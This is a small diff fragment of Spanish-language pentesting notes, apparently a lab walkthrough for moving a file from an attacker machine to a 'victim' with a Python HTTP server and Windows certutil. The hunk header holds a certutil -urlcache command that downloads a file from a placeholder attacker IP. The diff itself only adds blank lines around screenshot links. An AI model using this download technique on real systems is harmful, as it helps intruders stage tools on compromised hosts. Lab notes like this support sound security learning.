@@ -12,6 +12,8 @@ certutil -split -urlcache -f http://(IP ATACANTE)/ELARCHIVOQUE_QUEREMOS_COMPARTI
 python3 -m http.server 80
 ```
 - Vamos a la maquina victima y usamos la herramienta `certutil` .
+
 ![](../Imagenes/Pasted%20image%2020241211200816.png)
 - Estará cargando y nos saldrá esto:
+
 ![](../Imagenes/Pasted%20image%2020241211200853.png)
